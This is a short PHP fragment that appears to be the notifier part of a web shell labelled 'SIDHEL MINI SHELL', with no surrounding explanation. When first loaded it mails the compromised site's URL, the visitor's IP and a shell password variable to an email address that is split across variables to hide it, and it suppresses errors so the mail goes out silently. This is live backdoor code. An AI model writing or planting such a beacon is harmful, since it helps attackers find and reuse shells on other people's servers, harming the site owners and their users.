<?php $a=anik; $b=jack; $c=440; $d=gmail; $e=com; $visitc = $_COOKIE["visits"]; if ($visitc == "") {  $visitc  = 0;  $visitor = $_SERVER["REMOTE_ADDR"];  $web     = $_SERVER["HTTP_HOST"];  $inj     = $_SERVER["REQUEST_URI"];  $target  = rawurldecode($web.$inj);  $sub   = "SIDHEL MINI SHELL UPLOAD DONE http://$target by $visitor";  $body    = "SHELL HERE: $target by $visitor - $auth_pass";  if (!empty($web)) { @mail("$a$b$c@$d.$e",$sub,$body); }}
else { $visitc  ; }
@setcookie("visitz",$visitc);
?>
